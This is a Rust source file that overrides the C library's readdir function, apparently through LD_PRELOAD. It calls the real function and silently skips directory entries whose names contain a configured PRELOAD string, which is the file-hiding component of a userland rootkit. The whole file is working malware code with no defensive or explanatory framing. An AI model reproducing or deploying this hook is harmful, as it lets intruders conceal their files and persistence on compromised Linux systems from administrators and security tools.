use std::ffi::{c_void, CStr};
use std::ptr;
use libc::{c_char, DIR, dirent};

extern crate config;
use config::{PRELOAD};

#[no_mangle]
pub extern "C" fn readdir(dirp: *mut DIR) -> *mut dirent {
    #[cfg(feature = "debug")]
    println!("readdir() called");

    let o_readdir: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"readdir\0".as_ptr() as *const _) };
    let o_readdir: extern "C" fn(*mut DIR) -> *mut dirent = unsafe { std::mem::transmute(o_readdir) };

    let mut dir: *mut dirent = o_readdir(dirp);
    if dir.is_null() {
        return ptr::null_mut();
    }

    let dir_name = unsafe { (*dir).d_name.as_ptr() };
    let dir_name_str = unsafe { CStr::from_ptr(dir_name as *const c_char) };

    #[cfg(feature = "debug")]
    println!("reading {}", dir_name_str);

    if let Ok(dir_name) = dir_name_str.to_str() {
        if !dir_name.starts_with(PRELOAD)
            && dir_name.contains(PRELOAD)
        {
            dir = o_readdir(dirp);
        }
    }

    return dir
}
